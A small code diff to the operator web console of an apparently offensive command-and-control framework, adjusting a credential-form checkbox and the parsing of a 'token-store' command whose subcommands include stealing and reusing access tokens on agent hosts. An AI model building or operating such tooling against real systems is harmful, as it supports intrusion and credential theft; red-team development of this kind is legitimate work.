@@ -2702,11 +2702,9 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
           <input id="cred-domain" placeholder="CORP.LOCAL">
         </div>
       </div>
-      <div class="form-row" style="margin-top:-6px">
-        <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-weight:normal">
-          <input type="checkbox" id="cred-local" onchange="credLocalToggle()">
-          Local account (no domain)
-        </label>
+      <div class="form-row" style="margin-top:-6px;flex-direction:row;align-items:center;gap:6px">
+        <input type="checkbox" id="cred-local" onchange="credLocalToggle()" style="margin:0;flex-shrink:0">
+        <label for="cred-local" style="font-weight:normal;cursor:pointer;margin:0">Local account (no domain)</label>
       </div>
       <div class="form-row-inline">
         <div class="form-row">
@@ -10123,8 +10121,11 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'token-store': {
       const [sub,...rest2] = args.split(' ');
       if (sub==='steal') { taskType='TOKEN_STORE_STEAL'; taskArgs=rest2[0]||''; }
-      else if (sub==='use') { taskType='TOKEN_STORE_USE'; taskArgs=rest2[0]||''; }
-      else if (sub==='show') { taskType='TOKEN_STORE_SHOW'; }
+      else if (sub==='use') {
+        if (!rest2[0]) { addConsoleOutput('uso: token-store use <id>', '', null); return; }
+        taskType='TOKEN_STORE_USE'; taskArgs=rest2[0];
+      }
+      else if (sub==='show' || sub==='list') { taskType='TOKEN_STORE_SHOW'; }
       else if (sub==='remove') { taskType='TOKEN_STORE_REMOVE'; taskArgs=rest2[0]||''; }
       else if (sub==='clear') { taskType='TOKEN_STORE_CLEAR'; }
       break;
